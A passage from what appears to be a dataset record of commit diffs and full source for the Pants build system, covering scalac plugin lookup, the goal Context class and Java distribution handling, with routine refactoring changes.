ret\n\n  def _find_scalac_plugins(self, scalac_plugins, classpath):\n    \"\"\"Returns a map from plugin name to list of plugin classpath entries.\n\n    The first entry in each list is the classpath entry containing the plugin metadata.\n    The rest are the internal transitive deps of the plugin.\n\n    This allows us to have in-repo plugins with dependencies (unlike javac, scalac doesn't load\n    plugins or their deps from the regular classpath, so we have to provide these entries\n    separately, in the -Xplugin: flag).\n\n    Note that we don't currently support external plugins with dependencies, as we can't know which\n    external classpath elements are required, and we'd have to put the entire external classpath\n    on each -Xplugin: flag, which seems excessive.\n    Instead, external plugins should be published as \"fat jars\" (which appears to be the norm,\n    since SBT doesn't support plugins with dependencies anyway).\n    \"\"\"\n    # Allow multiple flags and also comma-separated values in a single flag.\n    plugin_names = {p for val in scalac_plugins for p in val.split(',')}\n    if not plugin_names:\n      return {}\n\n    active_plugins = {}\n    buildroot = get_buildroot()\n\n    cp_product = self.context.products.get_data('runtime_classpath')\n    for classpath_element in classpath:\n      name = self._maybe_get_plugin_name(classpath_element)\n      if name in plugin_names:\n        plugin_target_closure = self._plugin_targets('scalac').get(name, [])\n        # It's important to use relative paths, as the compiler flags get embedded in the zinc\n        # analysis file, and we port those between systems via the artifact cache.\n        rel_classpath_elements = [\n          os.path.relpath(cpe, buildroot) for cpe in\n          ClasspathUtil.internal_classpath(plugin_target_closure, cp_product, self._confs)]\n        # If the plugin is external then rel_classpath_elements will be empty, so we take\n        # just the external jar itself.\n        rel_classpath_elements = rel_classpath_elements or [classpath_element]\n        # Some classpath elements may be repeated, so we allow for that here.\n        if active_plugins.get(name, rel_classpath_elements) != rel_classpath_elements:\n          raise TaskError('Plugin {} defined in {} and in {}'.format(name, active_plugins[name],\n                                                                     classpath_element))\n        active_plugins[name] = rel_classpath_elements\n        if len(active_plugins) == len(plugin_names):\n          # We've found all the plugins, so return now to spare us from processing\n          # of the rest of the classpath for no reason.\n          return active_plugins\n\n    # If we get here we must have unresolved plugins.\n    unresolved_plugins = plugin_names - set(active_plugins.keys())\n    raise TaskError('Could not find requested plugins: {}'.format(list(unresolved_plugins)))\n\n  @classmethod\n  @memoized_method\n  def _maybe_get_plugin_name(cls, classpath_element):\n    \"\"\"If classpath_element is a scalac plugin, returns its name.\n\n    Returns None otherwise.\n    \"\"\"\n    def process_info_file(cp_elem, info_file):\n      plugin_info = ElementTree.parse(info_file).getroot()\n      if plugin_info.tag != 'plugin':\n        raise TaskError('File {} in {} is not a valid scalac plugin descriptor'.format(\n            _SCALAC_PLUGIN_INFO_FILE, cp_elem))\n      return plugin_info.find('name').text\n\n    if os.path.isdir(classpath_element):\n      try:\n        with open(os.path.join(classpath_element, _SCALAC_PLUGIN_INFO_FILE), 'r') as plugin_info_file:\n          return process_info_file(classpath_element, plugin_info_file)\n      except IOError as e:\n        if e.errno != errno.ENOENT:\n          raise\n    else:\n      with open_zip(classpath_element, 'r') as jarfile:\n        try:\n          with closing(jarfile.open(_SCALAC_PLUGIN_INFO_FILE, 'r')) as plugin_info_file:\n            return process_info_file(classpath_element, plugin_info_file)\n        except KeyError:\n          pass\n    return None\n\n\nclass ZincCompile(BaseZincCompile):\n  \"\"\"Compile Scala and Java code to classfiles using Zinc.\"\"\"\n\n  @classmethod\n  def product_types(cls):\n    return ['runtime_classpath', 'zinc_analysis', 'zinc_args']\n\n  def select(self, target):\n    # Require that targets are marked for JVM compilation, to differentiate from\n    # targets owned by the scalajs contrib module.\n    if not isinstance(target, JvmTarget):\n      return False\n    return target.has_sources('.java') or target.has_sources('.scala')\n\n  def select_source(self, source_file_path):\n    return source_file_path.endswith('.java') or source_file_path.endswith('.scala')\n\n  def execute(self):\n    if JvmPlatform.global_instance().get_options().compiler == 'zinc':\n      return super(ZincCompile, self).execute()\n"}, "/src/python/pants/goal/context.py": {"changes": [{"diff": "\n from pants.base.worker_pool import SubprocPool\n from pants.base.workunit import WorkUnit, WorkUnitLabel\n from pants.build_graph.target import Target\n-from pants.engine.isolated_process import FallibleExecuteProcessResult\n+from pants.engine.isolated_process import (FallibleExecuteProcessResult,\n+                                           fallible_to_exec_result_or_raise)\n from pants.goal.products import Products\n from pants.goal.workspace import ScmWorkspace\n from pants.process.lock import OwnerPrintingInterProcessFileLock\n", "add": 2, "remove": 1, "filename": "/src/python/pants/goal/context.py", "badparts": ["from pants.engine.isolated_process import FallibleExecuteProcessResult"], "goodparts": ["from pants.engine.isolated_process import (FallibleExecuteProcessResult,", "                                           fallible_to_exec_result_or_raise)"]}, {"diff": "\n       build_graph.inject_address_closure(address)\n     return build_graph\n \n-  def execute_process_synchronously(self, execute_process_request, name, labels=None):\n+  def execute_process_synchronously_without_raising(self, execute_process_request, name, labels=None):\n     \"\"\"Executes a process (possibly remotely), and returns information about its output.\n \n     :param execute_process_request: The ExecuteProcessRequest to run.\n", "add": 1, "remove": 1, "filename": "/src/python/pants/goal/context.py", "badparts": ["  def execute_process_synchronously(self, execute_process_request, name, labels=None):"], "goodparts": ["  def execute_process_synchronously_without_raising(self, execute_process_request, name, labels=None):"]}], "source": "\n from __future__ import absolute_import, division, print_function, unicode_literals import os import sys from builtins import filter, object from collections import defaultdict from contextlib import contextmanager from twitter.common.collections import OrderedSet from pants.base.build_environment import get_buildroot, get_scm from pants.base.worker_pool import SubprocPool from pants.base.workunit import WorkUnit, WorkUnitLabel from pants.build_graph.target import Target from pants.engine.isolated_process import FallibleExecuteProcessResult from pants.goal.products import Products from pants.goal.workspace import ScmWorkspace from pants.process.lock import OwnerPrintingInterProcessFileLock from pants.reporting.report import Report from pants.source.source_root import SourceRootConfig class Context(object): \"\"\"Contains the context for a single run of pants. Task implementations can access configuration data from pants.ini and any flags they have exposed here as well as information about the targets involved in the run. Advanced uses of the context include adding new targets to it for upstream or downstream goals to operate on and mapping of products a goal creates to the targets the products are associated with. :API: public \"\"\" class Log(object): \"\"\"A logger facade that logs into the pants reporting framework.\"\"\" def __init__(self, run_tracker): self._run_tracker=run_tracker def debug(self, *msg_elements): self._run_tracker.log(Report.DEBUG, *msg_elements) def info(self, *msg_elements): self._run_tracker.log(Report.INFO, *msg_elements) def warn(self, *msg_elements): self._run_tracker.log(Report.WARN, *msg_elements) def error(self, *msg_elements): self._run_tracker.log(Report.ERROR, *msg_elements) def fatal(self, *msg_elements): self._run_tracker.log(Report.FATAL, *msg_elements) def __init__(self, options, run_tracker, target_roots, requested_goals=None, target_base=None, build_graph=None, build_file_parser=None, address_mapper=None, console_outstream=None, scm=None, workspace=None, invalidation_report=None, scheduler=None): self._options=options self.build_graph=build_graph self.build_file_parser=build_file_parser self.address_mapper=address_mapper self.run_tracker=run_tracker self._log=self.Log(run_tracker) self._target_base=target_base or Target self._products=Products() self._buildroot=get_buildroot() self._source_roots=SourceRootConfig.global_instance().get_source_roots() self._lock=OwnerPrintingInterProcessFileLock(os.path.join(self._buildroot, '.pants.workdir.file_lock')) self._java_sysprops=None self.requested_goals=requested_goals or[] self._console_outstream=console_outstream or sys.stdout self._scm=scm or get_scm() self._workspace=workspace or(ScmWorkspace(self._scm) if self._scm else None) self._replace_targets(target_roots) self._invalidation_report=invalidation_report self._scheduler=scheduler @property def options(self): \"\"\"Returns the new-style options. :API: public \"\"\" return self._options @property def log(self): \"\"\"Returns the preferred logger for goals to use. :API: public \"\"\" return self._log @property def products(self): \"\"\"Returns the Products manager for the current run. :API: public \"\"\" return self._products @property def source_roots(self): \"\"\"Returns the:class:`pants.source.source_root.SourceRoots` instance for the current run. :API: public \"\"\" return self._source_roots @property def target_roots(self): \"\"\"Returns the targets specified on the command line. This set is strictly a subset of all targets in play for the run as returned by self.targets(). Note that for a command line invocation that uses wildcard selectors: or::, the targets globbed by the wildcards are considered to be target roots. :API: public \"\"\" return self._target_roots @property def console_outstream(self): \"\"\"Returns the output stream to write console messages to. :API: public \"\"\" return self._console_outstream @property def scm(self): \"\"\"Returns the current workspace's scm, if any. :API: public \"\"\" return self._scm @property def workspace(self): \"\"\"Returns the current workspace, if any.\"\"\" return self._workspace @property def invalidation_report(self): return self._invalidation_report def __str__(self): ident=Target.identify(self.targets()) return 'Context(id:{}, targets:{})'.format(ident, self.targets()) @contextmanager def executing(self): \"\"\"A contextmanager that sets metrics in the context of a(v1) engine execution.\"\"\" self._set_target_root_count_in_runtracker() yield self.run_tracker.pantsd_stats.set_scheduler_metrics(self._scheduler.metrics()) self._set_affected_target_count_in_runtracker() def _set_target_root_count_in_runtracker(self): \"\"\"Sets the target root count in the run tracker's daemon stats object.\"\"\" target_count=len(self._target_roots) self.run_tracker.pantsd_stats.set_target_root_size(target_count) return target_count def _set_affected_target_count_in_runtracker(self): \"\"\"Sets the realized target count in the run tracker's daemon stats object.\"\"\" target_count=len(self.build_graph) self.run_tracker.pantsd_stats.set_affected_targets_size(target_count) return target_count def submit_background_work_chain(self, work_chain, parent_workunit_name=None): \"\"\" :API: public \"\"\" background_root_workunit=self.run_tracker.get_background_root_workunit() if parent_workunit_name: workunit_parent_ctx=self.run_tracker.new_workunit_under_parent( name=parent_workunit_name, labels=[WorkUnitLabel.MULTITOOL], parent=background_root_workunit) workunit_parent=workunit_parent_ctx.__enter__() done_hook=lambda: workunit_parent_ctx.__exit__(None, None, None) else: workunit_parent=background_root_workunit done_hook=None self.run_tracker.background_worker_pool().submit_async_work_chain( work_chain, workunit_parent=workunit_parent, done_hook=done_hook) def background_worker_pool(self): \"\"\"Returns the pool to which tasks can submit background work. :API: public \"\"\" return self.run_tracker.background_worker_pool() def subproc_map(self, f, items): \"\"\"Map function `f` over `items` in subprocesses and return the result. :API: public :param f: A multiproc-friendly(importable) work function. :param items: A iterable of pickleable arguments to f. \"\"\" try: res=SubprocPool.foreground().map_async(f, items) while not res.ready(): res.wait(60) if not res.ready(): self.log.debug('subproc_map result still not ready...') return res.get() except KeyboardInterrupt: SubprocPool.shutdown(True) raise @contextmanager def new_workunit(self, name, labels=None, cmd='', log_config=None): \"\"\"Create a new workunit under the calling thread's current workunit. :API: public \"\"\" with self.run_tracker.new_workunit(name=name, labels=labels, cmd=cmd, log_config=log_config) as workunit: yield workunit def acquire_lock(self): \"\"\" Acquire the global lock for the root directory associated with this context. When a goal requires serialization, it will call this to acquire the lock. :API: public \"\"\" if self.options.for_global_scope().lock: if not self._lock.acquired: self._lock.acquire() def release_lock(self): \"\"\"Release the global lock if it's held. Returns True if the lock was held before this call. :API: public \"\"\" if not self._lock.acquired: return False else: self._lock.release() return True def is_unlocked(self): \"\"\"Whether the global lock object is actively holding the lock. :API: public \"\"\" return not self._lock.acquired def _replace_targets(self, target_roots): self._target_roots=list(target_roots) def add_new_target(self, address, target_type, target_base=None, dependencies=None, derived_from=None, **kwargs): \"\"\"Creates a new target, adds it to the context and returns it. This method ensures the target resolves files against the given target_base, creating the directory if needed and registering a source root. :API: public \"\"\" rel_target_base=target_base or address.spec_path abs_target_base=os.path.join(get_buildroot(), rel_target_base) if not os.path.exists(abs_target_base): os.makedirs(abs_target_base) if not self.source_roots.find_by_path(rel_target_base): self.source_roots.add_source_root(rel_target_base) if dependencies: dependencies=[dep.address for dep in dependencies] self.build_graph.inject_synthetic_target(address=address, target_type=target_type, dependencies=dependencies, derived_from=derived_from, **kwargs) new_target=self.build_graph.get_target(address) return new_target def targets(self, predicate=None, **kwargs): \"\"\"Selects targets in-play in this run from the target roots and their transitive dependencies. Also includes any new synthetic targets created from the target roots or their transitive dependencies during the course of the run. See Target.closure_for_targets for remaining parameters. :API: public :param predicate: If specified, the predicate will be used to narrow the scope of targets returned. :param bool postorder: `True` to gather transitive dependencies with a postorder traversal; `False` or preorder by default. :returns: A list of matching targets. \"\"\" target_set=self._collect_targets(self.target_roots, **kwargs) synthetics=OrderedSet() for synthetic_address in self.build_graph.synthetic_addresses: if self.build_graph.get_concrete_derived_from(synthetic_address) in target_set: synthetics.add(self.build_graph.get_target(synthetic_address)) target_set.update(self._collect_targets(synthetics, **kwargs)) return list(filter(predicate, target_set)) def _collect_targets(self, root_targets, **kwargs): return Target.closure_for_targets( target_roots=root_targets, **kwargs ) def dependents(self, on_predicate=None, from_predicate=None): \"\"\"Returns a map from targets that satisfy the from_predicate to targets they depend on that satisfy the on_predicate. :API: public \"\"\" core=set(self.targets(on_predicate)) dependees=defaultdict(set) for target in self.targets(from_predicate): for dependency in target.dependencies: if dependency in core: dependees[target].add(dependency) return dependees def resolve(self, spec): \"\"\"Returns an iterator over the target(s) the given address points to. :API: public \"\"\" return self.build_graph.resolve(spec) def scan(self, root=None): \"\"\"Scans and parses all BUILD files found under ``root``. Only BUILD files found under ``root`` are parsed as roots in the graph, but any dependencies of targets parsed in the root tree's BUILD files will be followed and this may lead to BUILD files outside of ``root`` being parsed and included in the returned build graph. :API: public :param string root: The path to scan; by default, the build root. :returns: A new build graph encapsulating the targets found. \"\"\" build_graph=self.build_graph.clone_new() for address in self.address_mapper.scan_addresses(root): build_graph.inject_address_closure(address) return build_graph def execute_process_synchronously(self, execute_process_request, name, labels=None): \"\"\"Executes a process(possibly remotely), and returns information about its output. :param execute_process_request: The ExecuteProcessRequest to run. :param name: A descriptive name representing the process being executed. :param labels: A tuple of WorkUnitLabels. :return: An ExecuteProcessResult with information about the execution. Note that this is an unstable, experimental API, which is subject to change with no notice. \"\"\" with self.new_workunit( name=name, labels=labels, cmd=' '.join(execute_process_request.argv), ) as workunit: result=self._scheduler.product_request(FallibleExecuteProcessResult,[execute_process_request])[0] workunit.output(\"stdout\").write(result.stdout) workunit.output(\"stderr\").write(result.stderr) workunit.set_outcome(WorkUnit.FAILURE if result.exit_code else WorkUnit.SUCCESS) return result ", "sourceWithComments": "# coding=utf-8\n# Copyright 2014 Pants project contributors (see CONTRIBUTORS.md).\n# Licensed under the Apache License, Version 2.0 (see LICENSE).\n\nfrom __future__ import absolute_import, division, print_function, unicode_literals\n\nimport os\nimport sys\nfrom builtins import filter, object\nfrom collections import defaultdict\nfrom contextlib import contextmanager\n\nfrom twitter.common.collections import OrderedSet\n\nfrom pants.base.build_environment import get_buildroot, get_scm\nfrom pants.base.worker_pool import SubprocPool\nfrom pants.base.workunit import WorkUnit, WorkUnitLabel\nfrom pants.build_graph.target import Target\nfrom pants.engine.isolated_process import FallibleExecuteProcessResult\nfrom pants.goal.products import Products\nfrom pants.goal.workspace import ScmWorkspace\nfrom pants.process.lock import OwnerPrintingInterProcessFileLock\nfrom pants.reporting.report import Report\nfrom pants.source.source_root import SourceRootConfig\n\n\nclass Context(object):\n  \"\"\"Contains the context for a single run of pants.\n\n  Task implementations can access configuration data from pants.ini and any flags they have exposed\n  here as well as information about the targets involved in the run.\n\n  Advanced uses of the context include adding new targets to it for upstream or downstream goals to\n  operate on and mapping of products a goal creates to the targets the products are associated with.\n\n  :API: public\n  \"\"\"\n\n  class Log(object):\n    \"\"\"A logger facade that logs into the pants reporting framework.\"\"\"\n\n    def __init__(self, run_tracker):\n      self._run_tracker = run_tracker\n\n    def debug(self, *msg_elements):\n      self._run_tracker.log(Report.DEBUG, *msg_elements)\n\n    def info(self, *msg_elements):\n      self._run_tracker.log(Report.INFO, *msg_elements)\n\n    def warn(self, *msg_elements):\n      self._run_tracker.log(Report.WARN, *msg_elements)\n\n    def error(self, *msg_elements):\n      self._run_tracker.log(Report.ERROR, *msg_elements)\n\n    def fatal(self, *msg_elements):\n      self._run_tracker.log(Report.FATAL, *msg_elements)\n\n  # TODO: Figure out a more structured way to construct and use context than this big flat\n  # repository of attributes?\n  def __init__(self, options, run_tracker, target_roots,\n               requested_goals=None, target_base=None, build_graph=None,\n               build_file_parser=None, address_mapper=None, console_outstream=None, scm=None,\n               workspace=None, invalidation_report=None, scheduler=None):\n    self._options = options\n    self.build_graph = build_graph\n    self.build_file_parser = build_file_parser\n    self.address_mapper = address_mapper\n    self.run_tracker = run_tracker\n    self._log = self.Log(run_tracker)\n    self._target_base = target_base or Target\n    self._products = Products()\n    self._buildroot = get_buildroot()\n    self._source_roots = SourceRootConfig.global_instance().get_source_roots()\n    self._lock = OwnerPrintingInterProcessFileLock(os.path.join(self._buildroot, '.pants.workdir.file_lock'))\n    self._java_sysprops = None  # Computed lazily.\n    self.requested_goals = requested_goals or []\n    self._console_outstream = console_outstream or sys.stdout\n    self._scm = scm or get_scm()\n    self._workspace = workspace or (ScmWorkspace(self._scm) if self._scm else None)\n    self._replace_targets(target_roots)\n    self._invalidation_report = invalidation_report\n    self._scheduler = scheduler\n\n  @property\n  def options(self):\n    \"\"\"Returns the new-style options.\n\n    :API: public\n    \"\"\"\n    return self._options\n\n  @property\n  def log(self):\n    \"\"\"Returns the preferred logger for goals to use.\n\n    :API: public\n    \"\"\"\n    return self._log\n\n  @property\n  def products(self):\n    \"\"\"Returns the Products manager for the current run.\n\n    :API: public\n    \"\"\"\n    return self._products\n\n  @property\n  def source_roots(self):\n    \"\"\"Returns the :class:`pants.source.source_root.SourceRoots` instance for the current run.\n\n    :API: public\n    \"\"\"\n    return self._source_roots\n\n  @property\n  def target_roots(self):\n    \"\"\"Returns the targets specified on the command line.\n\n    This set is strictly a subset of all targets in play for the run as returned by self.targets().\n    Note that for a command line invocation that uses wildcard selectors : or ::, the targets\n    globbed by the wildcards are considered to be target roots.\n\n    :API: public\n    \"\"\"\n    return self._target_roots\n\n  @property\n  def console_outstream(self):\n    \"\"\"Returns the output stream to write console messages to.\n\n    :API: public\n    \"\"\"\n    return self._console_outstream\n\n  @property\n  def scm(self):\n    \"\"\"Returns the current workspace's scm, if any.\n\n    :API: public\n    \"\"\"\n    return self._scm\n\n  @property\n  def workspace(self):\n    \"\"\"Returns the current workspace, if any.\"\"\"\n    return self._workspace\n\n  @property\n  def invalidation_report(self):\n    return self._invalidation_report\n\n  def __str__(self):\n    ident = Target.identify(self.targets())\n    return 'Context(id:{}, targets:{})'.format(ident, self.targets())\n\n  @contextmanager\n  def executing(self):\n    \"\"\"A contextmanager that sets metrics in the context of a (v1) engine execution.\"\"\"\n    self._set_target_root_count_in_runtracker()\n    yield\n    self.run_tracker.pantsd_stats.set_scheduler_metrics(self._scheduler.metrics())\n    self._set_affected_target_count_in_runtracker()\n\n  def _set_target_root_count_in_runtracker(self):\n    \"\"\"Sets the target root count in the run tracker's daemon stats object.\"\"\"\n    # N.B. `self._target_roots` is always an expanded list of `Target` objects as\n    # provided by `GoalRunner`.\n    target_count = len(self._target_roots)\n    self.run_tracker.pantsd_stats.set_target_root_size(target_count)\n    return target_count\n\n  def _set_affected_target_count_in_runtracker(self):\n    \"\"\"Sets the realized target count in the run tracker's daemon stats object.\"\"\"\n    target_count = len(self.build_graph)\n    self.run_tracker.pantsd_stats.set_affected_targets_size(target_count)\n    return target_count\n\n  def submit_background_work_chain(self, work_chain, parent_workunit_name=None):\n    \"\"\"\n    :API: public\n    \"\"\"\n    background_root_workunit = self.run_tracker.get_background_root_workunit()\n    if parent_workunit_name:\n      # We have to keep this workunit alive until all its child work is done, so\n      # we manipulate the context manually instead of using it as a contextmanager.\n      # This is slightly funky, but the with-context usage is so pervasive and\n      # useful elsewhere that it's worth the funkiness in this one place.\n      workunit_parent_ctx = self.run_tracker.new_workunit_under_parent(\n        name=parent_workunit_name, labels=[WorkUnitLabel.MULTITOOL], parent=background_root_workunit)\n      workunit_parent = workunit_parent_ctx.__enter__()\n      done_hook = lambda: workunit_parent_ctx.__exit__(None, None, None)\n    else:\n      workunit_parent = background_root_workunit  # Run directly under the root.\n      done_hook = None\n    self.run_tracker.background_worker_pool().submit_async_work_chain(\n      work_chain, workunit_parent=workunit_parent, done_hook=done_hook)\n\n  def background_worker_pool(self):\n    \"\"\"Returns the pool to which tasks can submit background work.\n\n    :API: public\n    \"\"\"\n    return self.run_tracker.background_worker_pool()\n\n  def subproc_map(self, f, items):\n    \"\"\"Map function `f` over `items` in subprocesses and return the result.\n\n      :API: public\n\n      :param f: A multiproc-friendly (importable) work function.\n      :param items: A iterable of pickleable arguments to f.\n    \"\"\"\n    try:\n      # Pool.map (and async_map().get() w/o timeout) can miss SIGINT.\n      # See: http://stackoverflow.com/a/1408476, http://bugs.python.org/issue8844\n      # Instead, we map_async(...), wait *with a timeout* until ready, then .get()\n      # NB: in 2.x, wait() with timeout wakes up often to check, burning CPU. Oh well.\n      res = SubprocPool.foreground().map_async(f, items)\n      while not res.ready():\n        res.wait(60)  # Repeatedly wait for up to a minute.\n        if not res.ready():\n          self.log.debug('subproc_map result still not ready...')\n      return res.get()\n    except KeyboardInterrupt:\n      SubprocPool.shutdown(True)\n      raise\n\n  @contextmanager\n  def new_workunit(self, name, labels=None, cmd='', log_config=None):\n    \"\"\"Create a new workunit under the calling thread's current workunit.\n\n    :API: public\n    \"\"\"\n    with self.run_tracker.new_workunit(name=name, labels=labels, cmd=cmd, log_config=log_config) as workunit:\n      yield workunit\n\n  def acquire_lock(self):\n    \"\"\" Acquire the global lock for the root directory associated with this context. When\n    a goal requires serialization, it will call this to acquire the lock.\n\n    :API: public\n    \"\"\"\n    if self.options.for_global_scope().lock:\n      if not self._lock.acquired:\n        self._lock.acquire()\n\n  def release_lock(self):\n    \"\"\"Release the global lock if it's held.\n    Returns True if the lock was held before this call.\n\n    :API: public\n    \"\"\"\n    if not self._lock.acquired:\n      return False\n    else:\n      self._lock.release()\n      return True\n\n  def is_unlocked(self):\n    \"\"\"Whether the global lock object is actively holding the lock.\n\n    :API: public\n    \"\"\"\n    return not self._lock.acquired\n\n  def _replace_targets(self, target_roots):\n    # Replaces all targets in the context with the given roots and their transitive dependencies.\n    #\n    # If another task has already retrieved the current targets, mutable state may have been\n    # initialized somewhere, making it now unsafe to replace targets. Thus callers of this method\n    # must know what they're doing!\n    #\n    # TODO(John Sirois): This currently has only 1 use (outside ContextTest) in pantsbuild/pants and\n    # only 1 remaining known use case in the Foursquare codebase that will be able to go away with\n    # the post RoundEngine engine - kill the method at that time.\n    self._target_roots = list(target_roots)\n\n  def add_new_target(self, address, target_type, target_base=None, dependencies=None,\n                     derived_from=None, **kwargs):\n    \"\"\"Creates a new target, adds it to the context and returns it.\n\n    This method ensures the target resolves files against the given target_base, creating the\n    directory if needed and registering a source root.\n\n    :API: public\n    \"\"\"\n    rel_target_base = target_base or address.spec_path\n    abs_target_base = os.path.join(get_buildroot(), rel_target_base)\n    if not os.path.exists(abs_target_base):\n      os.makedirs(abs_target_base)\n      # TODO: Adding source roots on the fly like this is yucky, but hopefully this\n      # method will go away entirely under the new engine. It's primarily used for injecting\n      # synthetic codegen targets, and that isn't how codegen will work in the future.\n    if not self.source_roots.find_by_path(rel_target_base):\n      # TODO: Set the lang and root category (source/test/thirdparty) based on the target type?\n      self.source_roots.add_source_root(rel_target_base)\n    if dependencies:\n      dependencies = [dep.address for dep in dependencies]\n\n    self.build_graph.inject_synthetic_target(address=address,\n                                             target_type=target_type,\n                                             dependencies=dependencies,\n                                             derived_from=derived_from,\n                                             **kwargs)\n    new_target = self.build_graph.get_target(address)\n\n    return new_target\n\n  def targets(self, predicate=None, **kwargs):\n    \"\"\"Selects targets in-play in this run from the target roots and their transitive dependencies.\n\n    Also includes any new synthetic targets created from the target roots or their transitive\n    dependencies during the course of the run.\n\n    See Target.closure_for_targets for remaining parameters.\n\n    :API: public\n\n    :param predicate: If specified, the predicate will be used to narrow the scope of targets\n                      returned.\n    :param bool postorder: `True` to gather transitive dependencies with a postorder traversal;\n                          `False` or preorder by default.\n    :returns: A list of matching targets.\n    \"\"\"\n    target_set = self._collect_targets(self.target_roots, **kwargs)\n\n    synthetics = OrderedSet()\n    for synthetic_address in self.build_graph.synthetic_addresses:\n      if self.build_graph.get_concrete_derived_from(synthetic_address) in target_set:\n        synthetics.add(self.build_graph.get_target(synthetic_address))\n    target_set.update(self._collect_targets(synthetics, **kwargs))\n\n    return list(filter(predicate, target_set))\n\n  def _collect_targets(self, root_targets, **kwargs):\n    return Target.closure_for_targets(\n      target_roots=root_targets,\n      **kwargs\n    )\n\n  def dependents(self, on_predicate=None, from_predicate=None):\n    \"\"\"Returns  a map from targets that satisfy the from_predicate to targets they depend on that\n      satisfy the on_predicate.\n\n    :API: public\n    \"\"\"\n    core = set(self.targets(on_predicate))\n    dependees = defaultdict(set)\n    for target in self.targets(from_predicate):\n      for dependency in target.dependencies:\n        if dependency in core:\n          dependees[target].add(dependency)\n    return dependees\n\n  def resolve(self, spec):\n    \"\"\"Returns an iterator over the target(s) the given address points to.\n\n    :API: public\n    \"\"\"\n    return self.build_graph.resolve(spec)\n\n  def scan(self, root=None):\n    \"\"\"Scans and parses all BUILD files found under ``root``.\n\n    Only BUILD files found under ``root`` are parsed as roots in the graph, but any dependencies of\n    targets parsed in the root tree's BUILD files will be followed and this may lead to BUILD files\n    outside of ``root`` being parsed and included in the returned build graph.\n\n    :API: public\n\n    :param string root: The path to scan; by default, the build root.\n    :returns: A new build graph encapsulating the targets found.\n    \"\"\"\n    build_graph = self.build_graph.clone_new()\n    for address in self.address_mapper.scan_addresses(root):\n      build_graph.inject_address_closure(address)\n    return build_graph\n\n  def execute_process_synchronously(self, execute_process_request, name, labels=None):\n    \"\"\"Executes a process (possibly remotely), and returns information about its output.\n\n    :param execute_process_request: The ExecuteProcessRequest to run.\n    :param name: A descriptive name representing the process being executed.\n    :param labels: A tuple of WorkUnitLabels.\n    :return: An ExecuteProcessResult with information about the execution.\n\n    Note that this is an unstable, experimental API, which is subject to change with no notice.\n    \"\"\"\n    with self.new_workunit(\n      name=name,\n      labels=labels,\n      cmd=' '.join(execute_process_request.argv),\n    ) as workunit:\n      result = self._scheduler.product_request(FallibleExecuteProcessResult, [execute_process_request])[0]\n      workunit.output(\"stdout\").write(result.stdout)\n      workunit.output(\"stderr\").write(result.stderr)\n      workunit.set_outcome(WorkUnit.FAILURE if result.exit_code else WorkUnit.SUCCESS)\n      return result\n"}, "/src/python/pants/java/distribution/distribution.py": {"changes": [{"diff": "\n from collections import namedtuple\n from contextlib import contextmanager\n \n-from future.utils import PY3\n+from future.utils import PY3, text_type\n from six import string_types\n \n from pants.base.revision import Revision\n", "add": 1, "remove": 1, "filename": "/src/python/pants/java/distribution/distribution.py", "badparts": ["from future.utils import PY3"], "goodparts": ["from future.utils import PY3, text_type"]}, {"diff": "\n         if self._is_executable(os.path.join(jdk_dir, 'bin', 'javac')):\n           home = jdk_dir\n       self._home = home\n-    return self._home\n+    return text_type(self._home)\n \n   @property\n   def real_home(self):\n", "add": 1, "remove": 1, "filename": "/src/python/pants/java/distribution/distribution.py", "badparts": ["    return self._home"], "goodparts": ["    return text_type(self._home)"]}], "source": "\n from __future__ import absolute_import, division, print_function, unicode_literals import itertools import logging import os import pkgutil import plistlib from abc import abstractproperty from builtins import object, open, str from collections import namedtuple from contextlib import contextmanager from future.utils import PY3 from six import string_types from pants.base.revision import Revision from pants.java.util import execute_java, execute_java_async from pants.subsystem.subsystem import Subsystem from pants.util.contextutil import temporary_dir from pants.util.memo import memoized_method, memoized_property from pants.util.meta import AbstractClass from pants.util.osutil import OS_ALIASES, normalize_os_name from pants.util.process_handler import subprocess logger=logging.getLogger(__name__) def _parse_java_version(name, version): if isinstance(version, string_types): version=Revision.lenient(version) if version and not isinstance(version, Revision): raise ValueError('{} must be a string or a Revision object, given:{}'.format(name, version)) return version class Distribution(object): \"\"\"Represents a java distribution -either a JRE or a JDK installed on the local system. In particular provides access to the distribution's binaries; ie: java while ensuring basic constraints are met. For example a minimum version can be specified if you know need to compile source code or run bytecode that exercise features only available in that version forward. :API: public TODO(John Sirois): This class has a broken API, its not reasonably useful with no methods exposed. Expose reasonable methods: https://github.com/pantsbuild/pants/issues/3263 \"\"\" class Error(Exception): \"\"\"Indicates an invalid java distribution.\"\"\" @staticmethod def _is_executable(path): return os.path.isfile(path) and os.access(path, os.X_OK) def __init__(self, home_path=None, bin_path=None, minimum_version=None, maximum_version=None, jdk=False): \"\"\"Creates a distribution wrapping the given `home_path` or `bin_path`. Only one of `home_path` or `bin_path` should be supplied. :param string home_path: the path to the java distribution's home dir :param string bin_path: the path to the java distribution's bin dir :param minimum_version: a modified semantic version string or else a Revision object :param maximum_version: a modified semantic version string or else a Revision object :param bool jdk: ``True`` to require the distribution be a JDK vs a JRE \"\"\" if home_path and not os.path.isdir(home_path): raise ValueError('The specified java home path is invalid:{}'.format(home_path)) if bin_path and not os.path.isdir(bin_path): raise ValueError('The specified binary path is invalid:{}'.format(bin_path)) if not bool(home_path) ^ bool(bin_path): raise ValueError('Exactly one of home path or bin path should be supplied, given: ' 'home_path={} bin_path={}'.format(home_path, bin_path)) self._home=home_path self._bin_path=bin_path or(os.path.join(home_path, 'bin') if home_path else '/usr/bin') self._minimum_version=_parse_java_version(\"minimum_version\", minimum_version) self._maximum_version=_parse_java_version(\"maximum_version\", maximum_version) self._jdk=jdk self._is_jdk=False self._system_properties=None self._validated_binaries={} @property def jdk(self): self.validate() return self._is_jdk @property def system_properties(self): \"\"\"Returns a dict containing the system properties of this java distribution.\"\"\" return dict(self._get_system_properties(self.java)) @property def version(self): \"\"\"Returns the distribution version. Raises Distribution.Error if this distribution is not valid according to the configured constraints. \"\"\" return self._get_version(self.java) def find_libs(self, names): \"\"\"Looks for jars in the distribution lib folder(s). If the distribution is a JDK, both the `lib` and `jre/lib` dirs will be scanned. The endorsed and extension dirs are not checked. :param list names: jar file names :return: list of paths to requested libraries :raises: `Distribution.Error` if any of the jars could not be found. \"\"\" def collect_existing_libs(): def lib_paths(): yield os.path.join(self.home, 'lib') if self.jdk: yield os.path.join(self.home, 'jre', 'lib') for name in names: for path in lib_paths(): lib_path=os.path.join(path, name) if os.path.exists(lib_path): yield lib_path break else: raise Distribution.Error('Failed to locate{} library'.format(name)) return list(collect_existing_libs()) @property def home(self): \"\"\"Returns the distribution JAVA_HOME.\"\"\" if not self._home: home=self._get_system_properties(self.java)['java.home'] if 